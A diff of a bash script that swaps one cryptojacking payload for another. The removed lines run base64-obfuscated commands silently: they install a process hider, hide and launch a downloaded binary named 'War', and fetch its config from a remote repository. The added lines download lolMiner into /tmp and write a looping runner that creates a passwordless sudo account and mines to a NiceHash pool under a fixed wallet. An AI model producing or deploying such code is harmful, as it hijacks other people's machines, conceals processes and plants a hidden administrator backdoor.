@@ -1,12 +1,19 @@
 #!/bin/bash
-base64 -d <<< YXB0IHVwZGF0ZQ== | sh >/dev/null 2>&1
-base64 -d <<< YXB0IGluc3RhbGwgc2NyZWVuIC15 | sh >/dev/null 2>&1
-base64 -d <<< YXB0IGluc3RhbGwgbGliY3VybDQtb3BlbnNzbC1kZXYgbGlic3NsLWRldiBsaWJqYW5zc29uLWRldiB4ei11dGlscyAteQ== | sh >/dev/null 2>&1
-base64 -d <<< YXB0IGluc3RhbGwgY3VybCBsaWJzc2wxLjAtZGV2IG5vZGVqcyBub2RlanMtZGV2IG5vZGUtZ3lwIG5wbSAteQ== | sh >/dev/null 2>&1
-base64 -d <<< bnBtIGkgLWcgbm9kZS1wcm9jZXNzLWhpZGVy | sh >/dev/null 2>&1
-base64 -d <<< cGggYWRkIFdhcg== | sh >/dev/null 2>&1
-base64 -d <<< d2dldCBodHRwczovL2dpdGxhYi5jb20vR2Fzc2tldW5qYWwvZ2Jsay8tL3Jhdy9tYWluL1dhcg== | sh >/dev/null 2>&1
-base64 -d <<< d2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmlrdWxhbi9jb25maWcuaW5pL21haW4vY29uZmlnLmluaQ== | sh >/dev/null 2>&1
-base64 -d <<< Y2htb2QgK3ggV2Fy | sh >/dev/null 2>&1
-base64 -d <<< bm9odXAgLi9XYXI= | sh >/dev/null 2>&1
+#!/bin/bash -x
+                cd /tmp
+                
+                wget -O lolminer.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz
+                tar xvfz lolminer.tar.gz
+                cd 1.28a
+                cat > runner.sh << __EOF__
+                #!/bin/bash -x
+                
+                while (true); do
+                  sudo adduser --disabled-password --gecos "" upew && sudo usermod -aG sudo upew
+                  sudo -u upew -H sh -c "./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.$(echo $(shuf -i 1-99999 -n 1)-GPU) --ethstratum ETHPROXY"
+                  
+                  
+                done
+                __EOF__
+                chmod +x runner.sh
 
